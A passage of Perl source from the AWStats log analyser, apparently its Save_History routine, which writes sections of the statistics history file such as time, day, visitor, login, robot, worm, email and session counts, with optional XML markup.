		$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
		$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
	  )
	  = ( '', '', '', '', '', '', '', '', '', '', '' );
	if ($xml) {
		(
			$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
			$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
		  )
		  = (
			"</comment><nu>\n", '</nu><recnb>',
			'</recnb><table>',  '<tr><th>',
			'</th><th>',        '</th></tr>',
			'<tr><td>',         '</td><td>',
			'</td></tr>',       '</table><nu>',
			"\n</nu></section>"
		  );
	}
	else { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }

	my $lastlinenb       = shift || 0;
	my $lastlineoffset   = shift || 0;
	my $lastlinechecksum = shift || 0;
	if ( !$lastlinenb ) {    # This happens for migrate
		$lastlinenb       = $LastLineNumber;
		$lastlineoffset   = $LastLineOffset;
		$lastlinechecksum = $LastLineChecksum;
	}

	if ($Debug) {
		debug(
" Save_History [sectiontosave=$sectiontosave,year=$year,month=$month,breakdate=$breakdate,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]",
			1
		);
	}
	my $spacebar      = "                    ";
	my %keysinkeylist = ();

	# Header
	if ( $sectiontosave eq 'header' ) {
		if ($xml) { print HISTORYTMP "<version><lib>\n"; }
		print HISTORYTMP "AWSTATS DATA FILE $VERSION\n";
		if ($xml) { print HISTORYTMP "</lib><comment>\n"; }
		print HISTORYTMP
"# If you remove this file, all statistics for date $breakdate will be lost/reset.\n";
		print HISTORYTMP
		  "# Last config file used to build this data file was $FileConfig.\n";
		if ($xml) { print HISTORYTMP "</comment></version>\n"; }
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP
"# Position (offset in bytes) in this file for beginning of each section for\n";
		print HISTORYTMP
"# direct I/O access. If you made changes somewhere in this file, you should\n";
		print HISTORYTMP
"# also remove completely the MAP section (AWStats will rewrite it at next\n";
		print HISTORYTMP "# update).\n";
		print HISTORYTMP "${xmlbb}BEGIN_MAP${xmlbs}"
		  . ( 27 + ( scalar keys %TrapInfosForHTTPErrorCodes ) +
			  ( scalar @ExtraName ? scalar @ExtraName - 1 : 0 ) +
			  ( scalar keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) )
		  . "${xmlbe}\n";
		print HISTORYTMP "${xmlrb}POS_GENERAL${xmlrs}";
		$PosInFile{"general"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# When
		print HISTORYTMP "${xmlrb}POS_TIME${xmlrs}";
		$PosInFile{"time"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_VISITOR${xmlrs}";
		$PosInFile{"visitor"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_DAY${xmlrs}";
		$PosInFile{"day"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Who
		print HISTORYTMP "${xmlrb}POS_DOMAIN${xmlrs}";
		$PosInFile{"domain"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_LOGIN${xmlrs}";
		$PosInFile{"login"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_ROBOT${xmlrs}";
		$PosInFile{"robot"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_WORMS${xmlrs}";
		$PosInFile{"worms"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_EMAILSENDER${xmlrs}";
		$PosInFile{"emailsender"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_EMAILRECEIVER${xmlrs}";
		$PosInFile{"emailreceiver"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Navigation
		print HISTORYTMP "${xmlrb}POS_SESSION${xmlrs}";
		$PosInFile{"session"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
                print HISTORYTMP "${xmlrb}POS_FILESIZE${xmlrs}";
                $PosInFile{"filesize"} = tell HISTORYTMP;
                print HISTORYTMP "$spacebar${xmlre}\n";
                print HISTORYTMP "${xmlrb}POS_REQUESTTIME${xmlrs}";
                $PosInFile{"requesttime"} = tell HISTORYTMP;
                print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SIDER${xmlrs}";
		$PosInFile{"sider"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_FILETYPES${xmlrs}";
		$PosInFile{"filetypes"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_DOWNLOADS${xmlrs}";
		$PosInFile{'downloads'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_OS${xmlrs}";
		$PosInFile{"os"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_BROWSER${xmlrs}";
		$PosInFile{"browser"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SCREENSIZE${xmlrs}";
		$PosInFile{"screensize"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERER${xmlrs}";
		$PosInFile{'unknownreferer'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERERBROWSER${xmlrs}";
		$PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Referers
		print HISTORYTMP "${xmlrb}POS_ORIGIN${xmlrs}";
		$PosInFile{"origin"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SEREFERRALS${xmlrs}";
		$PosInFile{"sereferrals"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_PAGEREFS${xmlrs}";
		$PosInFile{"pagerefs"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SEARCHWORDS${xmlrs}";
		$PosInFile{"searchwords"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_KEYWORDS${xmlrs}";
		$PosInFile{"keywords"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Others
		print HISTORYTMP "${xmlrb}POS_MISC${xmlrs}";
		$PosInFile{"misc"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_ERRORS${xmlrs}";
		$PosInFile{"errors"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_CLUSTER${xmlrs}";
		$PosInFile{"cluster"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		foreach ( keys %TrapInfosForHTTPErrorCodes ) {
			print HISTORYTMP "${xmlrb}POS_SIDER_$_${xmlrs}";
			$PosInFile{"sider_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		foreach ( 1 .. @ExtraName - 1 ) {
			print HISTORYTMP "${xmlrb}POS_EXTRA_$_${xmlrs}";
			$PosInFile{"extra_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
			print HISTORYTMP "${xmlrb}POS_PLUGIN_$_${xmlrs}";
			$PosInFile{"plugin_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_MAP${xmlee}\n";
	}

	# General
	if ( $sectiontosave eq 'general' ) {
		$LastUpdate = int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP
"# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value\n";
		print HISTORYTMP
		  "# FirstTime   = Date of first visit for history file\n";
		print HISTORYTMP
		  "# LastTime    = Date of last visit for history file\n";
		print HISTORYTMP
"# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped\n";
		print HISTORYTMP "# TotalVisits = Number of visits\n";
		print HISTORYTMP "# TotalUnique = Number of unique visitors\n";
		print HISTORYTMP "# MonthHostsKnown   = Number of hosts known\n";
		print HISTORYTMP "# MonthHostsUnKnown = Number of hosts unknown\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_GENERAL${xmlbs}8${xmlbe}\n";
		print HISTORYTMP "${xmlrb}LastLine${xmlrs}"
		  . ( $LastLine > 0 ? $LastLine : $LastTime{$breakdate} )
		  . " $lastlinenb $lastlineoffset $lastlinechecksum${xmlre}\n";
		print HISTORYTMP "${xmlrb}FirstTime${xmlrs}"
		  . $FirstTime{$breakdate}
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}LastTime${xmlrs}"
		  . $LastTime{$breakdate}
		  . "${xmlre}\n";
		print HISTORYTMP
"${xmlrb}LastUpdate${xmlrs}$LastUpdate $NbOfLinesParsed $NbOfOldLines $NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped${xmlre}\n";
		print HISTORYTMP "${xmlrb}TotalVisits${xmlrs}";
		$PosInFile{"TotalVisits"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}TotalUnique${xmlrs}";
		$PosInFile{"TotalUnique"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}MonthHostsKnown${xmlrs}";
		$PosInFile{"MonthHostsKnown"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}MonthHostsUnknown${xmlrs}";
		$PosInFile{"MonthHostsUnknown"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmleb}"
		  . ( ${xmleb} ? "\n" : "" )
		  . "END_GENERAL${xmlee}\n"
		  ; # END_GENERAL on a new line following xml tag because END_ detection does not work like other sections
	}

	# When
	if ( $sectiontosave eq 'time' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP
"# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_TIME${xmlbs}24${xmlbe}\n";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			print HISTORYTMP "${xmlrb}$ix${xmlrs}"
			  . int( $_time_p[$ix] )
			  . "${xmlrs}"
			  . int( $_time_h[$ix] )
			  . "${xmlrs}"
			  . int( $_time_k[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_p[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_h[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_k[$ix] )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_TIME${xmlee}\n";
	}
	if ( $sectiontosave eq 'day' )
	{    # This section must be saved after VISITOR section is read
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Date - Pages - Hits - Bandwidth - Visits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DAY${xmlbs}"
		  . ( scalar keys %DayHits )
		  . "${xmlbe}\n";
		my $monthvisits = 0;
		foreach ( sort keys %DayHits ) {
			if ( $_ =~ /^$year$month/i ) { # Found a day entry of the good month
				my $page   = $DayPages{$_}  || 0;
				my $hits   = $DayHits{$_}   || 0;
				my $bytes  = $DayBytes{$_}  || 0;
				my $visits = $DayVisits{$_} || 0;
				print HISTORYTMP
"${xmlrb}$_${xmlrs}$page${xmlrs}$hits${xmlrs}$bytes${xmlrs}$visits${xmlre}\n";
				$monthvisits += $visits;
			}
		}
		$MonthVisits{ $year . $month } = $monthvisits;
		print HISTORYTMP "${xmleb}END_DAY${xmlee}\n";
	}

	# Who
	if ( $sectiontosave eq 'domain' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'Domain'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# Domain - Pages - Hits - Bandwidth\n";
		print HISTORYTMP
"# The $MaxNbOf{'Domain'} first Pages must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DOMAIN${xmlbs}"
		  . ( scalar keys %_domener_h )
		  . "${xmlbe}\n";

# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList(
			$MaxNbOf{'Domain'}, $MinHit{'Domain'},
			\%_domener_h,       \%_domener_p
		);
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $page = $_domener_p{$_} || 0;
			my $bytes = $_domener_k{$_}
			  || 0;    # ||0 could be commented to reduce history file size
			print HISTORYTMP
"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
		}
		foreach ( keys %_domener_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $page = $_domener_p{$_} || 0;
			my $bytes = $_domener_k{$_}
			  || 0;    # ||0 could be commented to reduce history file size
			print HISTORYTMP
"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_DOMAIN${xmlee}\n";
	}
	if ( $sectiontosave eq 'visitor' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'HostsShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP
"# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]\n";
		print HISTORYTMP
"# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished\n";
		print HISTORYTMP
"# The $MaxNbOf{'HostsShown'} first Hits must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_VISITOR${xmlbs}"
		  . ( scalar keys %_host_h )
		  . "${xmlbe}\n";
		my $monthhostsknown = 0;

# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
			\%_host_p );
		my %keysinkeylist = ();
		foreach my $key (@keylist) {
			if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
				$monthhostsknown++;
			}
			$keysinkeylist{$key} = 1;
			my $page      = $_host_p{$key} || 0;
			my $bytes     = $_host_k{$key} || 0;
			my $timehostl = $_host_l{$key} || 0;
			my $timehosts = $_host_s{$key} || 0;
			my $lastpage  = $_host_u{$key} || '';
			if ( $timehostl && $timehosts && $lastpage ) {

				if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {

					# Session for this user is expired
					if ($timehosts) {
						$_session{ GetSessionRange( $timehosts, $timehostl ) }
						  ++;
					}
					if ($lastpage) { $_url_x{$lastpage}++; }
					delete $_host_s{$key};
					delete $_host_u{$key};
					print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
				}
				else {

					# If this user has started a new session that is not expired
					print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
				}
			}
			else {
				my $hostl = $timehostl || '';
				print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
			}
		}
		foreach my $key ( keys %_host_h ) {
			if ( $keysinkeylist{$key} ) { next; }
			if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
				$monthhostsknown++;
			}
			my $page      = $_host_p{$key} || 0;
			my $bytes     = $_host_k{$key} || 0;
			my $timehostl = $_host_l{$key} || 0;
			my $timehosts = $_host_s{$key} || 0;
			my $lastpage  = $_host_u{$key} || '';
			if ( $timehostl && $timehosts && $lastpage ) {
				if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {

					# Session for this user is expired
					if ($timehosts) {
						$_session{ GetSessionRange( $timehosts, $timehostl ) }
						  ++;
					}
					if ($lastpage) { $_url_x{$lastpage}++; }
					delete $_host_s{$key};
					delete $_host_u{$key};
					print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
				}
				else {

					# If this user has started a new session that is not expired
					print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
				}
			}
			else {
				my $hostl = $timehostl || '';
				print HISTORYTMP
"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
			}
		}
		$MonthUnique{ $year . $month }       = ( scalar keys %_host_p );
		$MonthHostsKnown{ $year . $month }   = $monthhostsknown;
		$MonthHostsUnknown{ $year . $month } =
		  ( scalar keys %_host_h ) - $monthhostsknown;
		print HISTORYTMP "${xmleb}END_VISITOR${xmlee}\n";
	}
	if ( $sectiontosave eq 'login' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'LoginShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# Login - Pages - Hits - Bandwidth - Last visit\n";
		print HISTORYTMP
"# The $MaxNbOf{'LoginShown'} first Pages must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_LOGIN${xmlbs}"
		  . ( scalar keys %_login_h )
		  . "${xmlbe}\n";

# We save login list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
			\%_login_p );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_login_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_k{$_} || 0 )
			  . "${xmlrs}"
			  . ( $_login_l{$_} || '' )
			  . "${xmlre}\n";
		}
		foreach ( keys %_login_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_login_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_k{$_} || 0 )
			  . "${xmlrs}"
			  . ( $_login_l{$_} || '' )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_LOGIN${xmlee}\n";
	}
	if ( $sectiontosave eq 'robot' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RobotShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP
		  "# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt\n";
		print HISTORYTMP
"# The $MaxNbOf{'RobotShown'} first Hits must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ROBOT${xmlbs}"
		  . ( scalar keys %_robot_h )
		  . "${xmlbe}\n";

# We save robot list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
			\%_robot_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_robot_h{$_} )
			  . "${xmlrs}"
			  . int( $_robot_k{$_} )
			  . "${xmlrs}$_robot_l{$_}${xmlrs}"
			  . int( $_robot_r{$_} || 0 )
			  . "${xmlre}\n";
		}
		foreach ( keys %_robot_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_robot_h{$_} )
			  . "${xmlrs}"
			  . int( $_robot_k{$_} )
			  . "${xmlrs}$_robot_l{$_}${xmlrs}"
			  . int( $_robot_r{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_ROBOT${xmlee}\n";
	}
	if ( $sectiontosave eq 'worms' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'WormsShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# Worm ID - Hits - Bandwidth - Last visit\n";
		print HISTORYTMP
"# The $MaxNbOf{'WormsShown'} first Hits must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_WORMS${xmlbs}"
		  . ( scalar keys %_worm_h )
		  . "${xmlbe}\n";

# We save worm list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
			\%_worm_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_worm_h{$_} )
			  . "${xmlrs}"
			  . int( $_worm_k{$_} )
			  . "${xmlrs}$_worm_l{$_}${xmlre}\n";
		}
		foreach ( keys %_worm_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_worm_h{$_} )
			  . "${xmlrs}"
			  . int( $_worm_k{$_} )
			  . "${xmlrs}$_worm_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_WORMS${xmlee}\n";
	}
	if ( $sectiontosave eq 'emailsender' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
		print HISTORYTMP
"# The $MaxNbOf{'EMailsShown'} first Hits must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_EMAILSENDER${xmlbs}"
		  . ( scalar keys %_emails_h )
		  . "${xmlbe}\n";

# We save sender email list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emails_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emails_k{$_} || 0 )
			  . "${xmlrs}$_emails_l{$_}${xmlre}\n";
		}
		foreach ( keys %_emails_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emails_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emails_k{$_} || 0 )
			  . "${xmlrs}$_emails_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_EMAILSENDER${xmlee}\n";
	}
	if ( $sectiontosave eq 'emailreceiver' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
		print HISTORYTMP
"# The $MaxNbOf{'EMailsShown'} first hits must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_EMAILRECEIVER${xmlbs}"
		  . ( scalar keys %_emailr_h )
		  . "${xmlbe}\n";

# We save receiver email list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
			\%_emailr_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emailr_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emailr_k{$_} || 0 )
			  . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
		}
		foreach ( keys %_emailr_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emailr_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emailr_k{$_} || 0 )
			  . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_EMAILRECEIVER${xmlee}\n";
	}

	# Navigation
	if ( $sectiontosave eq 'session' )
	{    # This section must be saved after VISITOR section is read
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Session range - Number of visits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SESSION${xmlbs}"
		  . ( scalar keys %_session )
		  . "${xmlbe}\n";
		foreach ( keys %_session ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_session{$_} )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SESSION${xmlee}\n";
	}
        if ($sectiontosave eq 'filesize')
        {   # This section must be saved after VISITOR section is read
                print HISTORYTMP "\n";
                if ($xml) {
                        print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
                }
                print HISTORYTMP "# Payload Range - Payload Frequency\n";
                $ValueInFile{$sectiontosave} = tell HISTORYTMP;
                print HISTORYTMP "${xmlbb}BEGIN_FILESIZE${xmlbs}"
                  . ( scalar keys %_filesize )
                  . "${xmlbe}\n";
                foreach ( keys %_filesize) {
                        print HISTORYTMP "${xmlrb}$_${xmlrs}"
                          . int( $_filesize{$_} )
                          . "${xmlre}\n";
                }
                print HISTORYTMP "${xmleb}END_FILESIZE${xmlee}\n";

        }
        if ( $sectiontosave eq 'requesttime' ) {
                print HISTORYTMP "\n";
                if ($xml) {
                        print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
                }
                print HISTORYTMP "# Request Time Range - Request Time Frequency\n";
                $ValueInFile{$sectiontosave} = tell HISTORYTMP;
                print HISTORYTMP "${xmlbb}BEGIN_REQUESTTIME${xmlbs}"
                  . ( scalar keys %_requesttime )
                  . "${xmlbe}\n";
                foreach ( keys %_requesttime ) {
                        print HISTORYTMP "${xmlrb}$_${xmlrs}"
                          . int( $_requesttime{$_} )
                          . "${xmlre}\n";
                }
                print HISTORYTMP "${xmleb}END_REQUESTTIME${xmlee}\n";

        }
	if ( $sectiontosave eq 'sider' )
	{    # This section must be saved after VISITOR section is read
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'PageShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# URL - Pages - Bandwidth - Entry - Exit\n";
		print HISTORYTMP
"# The $MaxNbOf{'PageShown'} first Pages must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SIDER${xmlbs}"
		  . ( scalar keys %_url_p )
		  . "${xmlbe}\n";

# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
			\%_url_p );
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $newkey = $_;
			$newkey =~ s/([^:])\/\//$1\//g
			  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_url_p{$_} || 0 )
			  . "${xmlrs}"
